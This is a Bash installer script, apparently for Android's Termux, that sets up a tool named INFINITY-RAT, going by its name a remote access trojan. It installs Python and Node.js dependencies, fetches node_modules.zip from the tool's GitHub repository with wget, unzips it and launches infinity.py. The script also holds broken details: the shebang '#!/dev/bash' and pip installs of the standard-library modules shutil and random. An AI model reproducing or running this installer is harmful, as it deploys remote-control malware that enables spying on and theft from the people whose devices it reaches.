#!/dev/bash
#20/11/2023
#01/01/2024

g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"

clear
echo -e "$g  _____   _   _    _____   _______              _        _  "
echo -e "$g |_   _| | \ | |  / ____| |__   __|     /\     | |      | | "
echo -e "$g   | |   |  \| | | (___      | |       /  \    | |      | | "
echo -e "$b   | |   | .   |  \___ \     | |      / /\ \   | |      | | "
echo -e "$b  _| |_  | |\  |  ____) |    | |     / ____ \  | |____  | |____ "
echo -e "$b |_____| |_| \_| |_____/     |_|    /_/    \_\ |______| |______|"
0x00(){
	echo -e " ${g}node_modules is Downloading...${w}"
	wget -O node_modules.zip https://github.com/infinitynetwork13/INFINITY-RAT/raw/main/node_modules.zip> /dev/null 2>&1
	echo -e " ${g}node_modules unzipping...${w}"
	unzip node_modules.zip
}
sleep 1
if command -v python &> /dev/null; then
	echo -e "\n ${g}Python Is Installed${w}"
	sleep 0.5
else
	echo -e "\n${r} Python not Installed${w}"
	sleep 0.5
	echo -e "\n ${g}Python js is installing...${w}"
	sleep 0.5
	pkg install python -y
fi
if python -c "import requests"&> /dev/null; then
	echo -e "\n ${g}Requests Is Installed${w}"
	sleep 0.5
else
	echo -e "\n ${r}Requests not Installed${w}"
	sleep 0.5
	echo -e "\n ${g}Requests is Installing...${w}"
	pip install requests
	sleep 0.5
fi
if python -c "import shutil"&> /dev/null; then
	echo -e "\n ${g}Shutil is Installed${w}"
	sleep 0.5
else
	echo -e "\n ${r}Shutil not installed${w}"
	sleep 0.5
	echo -e "\n ${g}Shutil Is installing...${w}"
	pip install shutil
fi
if python -c "import random"&> /dev/null; then
	echo -e "\n ${g}Random is installed${w}"
	sleep 0.5
else
	echo -e "\n ${r}Random not installed${w}"
	sleep 0.5
	echo -e "\n ${g}Random is installing...${w}"
	pip install random
fi
if command -v node &> /dev/null; then
	echo -e "\n ${g}Node js Is Installed${w}"
	sleep 0.5
else
	echo -e "\n ${r}Node js not Installed${w}"
	sleep 0.5
	echo -e "\n ${g}Node js is installing...${w}"
	pkg install nodejs -y
	sleep 0.5
fi
if [ -d "node_modules" ]; then
	echo -e "\n ${b}Please Wait 5 minutes...${w}"
	rm -rf node_modules
	rm -rf node_modules.zip
	0x00
else
	if [ -f "node_modules.zip" ]; then
		echo -e "\n ${g}Please Wait...${w}"
		rm -rf node_modules.zip
		0x00
	else
		0x00
	fi
fi
python infinity.py
